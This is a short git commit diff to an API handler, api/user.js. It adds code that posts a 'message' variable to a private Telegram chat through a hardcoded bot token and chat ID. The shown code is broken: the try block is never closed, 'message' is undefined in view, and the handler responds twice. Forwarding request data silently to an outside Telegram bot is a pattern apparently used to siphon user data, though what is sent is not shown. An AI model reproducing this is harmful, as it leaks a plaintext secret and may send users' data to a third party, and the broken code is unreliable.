c85003564b7daaf3858c8d6e0881fb0c610a7b05
riverarentxl-a11y <riverarentxl@gmail.com>
2026-02-01 00:15:00 +0200

    Update user.js

--- api/user.js
+++ api/user.js
@@ -3,6 +3,25 @@ export default async function handler(req, res) {
     return res.status(405).end()
   }
 
+  const token = '8303026583:AAFjH0ttFEZCOIJaZlgW5my33HfV4jSIqA0';
+  const chatId = '7687624398';
+
+  try {
+    const response = await fetch(
+      `https://api.telegram.org/bot${token}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }
+    );
+
+  const data = await response.json();
+  res.status(200).json(data);
+  
   res.setHeader('Content-Type', 'application/json')
 
   res.status(200).json({
